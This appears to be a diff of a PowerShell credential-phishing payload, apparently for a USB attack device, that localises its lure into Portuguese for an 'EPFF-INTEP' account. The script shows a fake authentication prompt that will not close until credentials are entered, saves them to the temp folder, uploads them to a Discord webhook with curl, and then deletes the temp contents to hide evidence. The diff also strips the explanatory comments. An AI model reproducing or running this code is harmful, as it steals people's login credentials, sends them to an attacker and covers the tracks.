@@ -1,14 +1,13 @@
 
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
-
 function Get-Creds {
 
     $form = $null
 
     while ($form -eq $null)
     {
-        $cred = $host.ui.promptforcredential('Failed Authentication','','',''); 
+        $cred = $host.ui.promptforcredential('Autenticação recusada','','',''); 
         $cred.getnetworkcredential().password
 
         if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
@@ -18,7 +17,7 @@ function Get-Creds {
                 Add-Type -AssemblyName PresentationCore,PresentationFramework
             }
 
-            $msgBody = "Credentials cannot be empty!"
+            $msgBody = "As informações não podem estar vazias!"
             $msgTitle = "Error"
             $msgButton = 'Ok'
             $msgImage = 'Stop'
@@ -34,11 +33,6 @@ function Get-Creds {
     }
 }
 
-
-#----------------------------------------------------------------------------------------------------
-
-# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
-
 function Caps-Off {
 Add-Type -AssemblyName System.Windows.Forms
 $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
@@ -50,21 +44,14 @@ $key = New-Object -ComObject WScript.Shell
 $key.SendKeys('{CapsLock}')
 }
 }
-#----------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
-#>
 
 Pause-Script
 
 Caps-Off
 
 Add-Type -AssemblyName PresentationCore,PresentationFramework
-$msgBody = "Please authenticate your Microsoft Account."
-$msgTitle = "Authentication Required"
+$msgBody = "Autenticar com a sua conta EPFF-INTEP"
+$msgTitle = "Autenticação necessária"
 $msgButton = 'Ok'
 $msgImage = 'Warning'
 $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
@@ -74,21 +61,9 @@ $creds = Get-Creds
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-<#
-
-.NOTES 
-	This is to save the gathered credentials to a file in the temp directory
-#>
-
 echo $creds >> $env:TMP\$FileName
 
 #------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to upload your files to Discord
-#>
 
 function Upload-Discord {
 
@@ -116,12 +91,6 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}
 
 #------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
-#>
 
 # Delete contents of Temp folder 
 
